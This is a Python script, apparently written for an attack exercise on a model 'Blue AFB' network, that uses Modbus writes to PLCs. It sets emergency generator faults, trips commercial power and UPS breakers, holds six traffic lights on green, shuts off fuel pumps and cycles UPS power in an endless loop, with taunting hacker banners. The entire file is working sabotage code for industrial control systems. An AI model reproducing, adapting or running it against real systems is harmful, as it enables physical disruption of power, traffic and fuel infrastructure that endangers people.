from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from time import sleep

GEN_OCTETS = '10.100.1.'  # Sets up the first three octets to target the electrical distribution system.
TRAFFIC_OCTETS = '10.200.1.'  # Sets up the octets for the traffic lights
FUEL_IP = '10.150.1.101'  # IP address for fuel model


def gen_faults():
	"""Shuts down emergency generators.

	'k' will complete the IP address for each PLC in the electrical distribution system. Each will be targeted by the
	attack:  10.100.1.101, 102, 103, and 104.
	"""
	for k in range(101, 105):
		target = GEN_OCTETS + str(k)
		print(" [+] Attacking ", target)
		print(" [+] Sending fault to generator")
		client = ModbusClient(target)
		result = client.read_coils(48, 1)  # Read status of each generator fault alarm
		if not result.bits[0]:  # If fault doesn't exist...
			client.write_coil(48, True)  # Set generator fault
		print(" [+] Complete")
		sleep(1)


def power_grid():
	"""Take out commercial power and UPS breaker"""
	print("""Watch Blue AFB go dark!
Get out your night vision, yo!""")
	for j in range(101, 105):
		target = GEN_OCTETS + str(j)
		print(" [+] Attacking ", target)
		print(" [+] Tripping Commercial Power and UPS Breaker")
		client = ModbusClient(target)

		# Trip the Commercial Power and UPS Breaker
		client.write_coil(16, False)  # Commercial power
		client.write_coil(32, False)  # UPS
		print(" [+] Complete")
		sleep(1)


def traffic_lights():
	"""Take out traffic lights"""
	print("""\nAttacking Traffic Lights, yo!
Fuck RED LIGHTS!!  FUCK EM!!\n""")
	for j in range(101, 107):
		# Range attacks all six traffic lights on Blue AFB.
		# 10.200.1.101 - Main and First
		# 10.200.1.102 - Main and Second
		# 10.200.1.103 - Main and Third
		# 10.200.1.104 - Main and Fourth
		# 10.200.1.105 - Main and Fifth
		# 10.200.1.106 - Main and Sixth
		#
		target = TRAFFIC_OCTETS + str(j)
		print(" [+] Attacking ", target)
		print(" [+] Setting Traffic Light Green Lights to 500 Seconds")
		client = ModbusClient(target)
		client.write_register(0, 500)
		client.write_register(2, 500)
		print(" [+] Complete")
		sleep(1)


def fuel_system():
	"""Take out fuel distribution system"""
	target = "10.150.1.101"
	print("""\nAttacking Fuel Distribution System!
AIN'T GOT NO GAS IN IT!!!\n""")
	client = ModbusClient(target)
	print(" [+] Turning off all fuel pumps")
	client.write_coil(8, False)
	client.write_coil(16, False)
	client.write_coil(24, False)
	print(" [+] Complete")
	sleep(1)


def cycle_power():
	"""Cause power fluctuations via UPS"""
	print("\nPower Surges at the AFB\n")
	for l in range(10):
		for j in range(101, 105):
			target = GEN_OCTETS + str(j)
			client = ModbusClient(target)
			print(" [+] Attacking ",target)
			print(" [+] Power On")
			client.write_coil(32, True)  # UPS
			sleep(2)
			client.write_coil(32, False)
			print(" [+] Power Off")


def launch_attack():
	"""Disrupt power to model"""
	while True:
		power_grid()  # First target will be the electric distribution
		sleep(1)  # Pause for one second and take a break.
		traffic_lights()  # Rearm the weapon to address the traffic lights.
		fuel_system()  # Resetting the weapon for the Fuel System
		cycle_power() # Cycle UPS power


if __name__ == '__main__':
	print("""\nWe 0wns yo gener@tors!!
... K1ng Hydr0fl@x ... Master of the Galaxy ...
... or at least Master of dees gener@t0rs!!\n
G  A  M  E     O  V  E  R""")

	print("\nLet's start by shutting down the emergency generators...\n")
	gen_faults()

	print("Bye bye power!")
	launch_attack()  # Run attack until halted by the attacker using ^c.
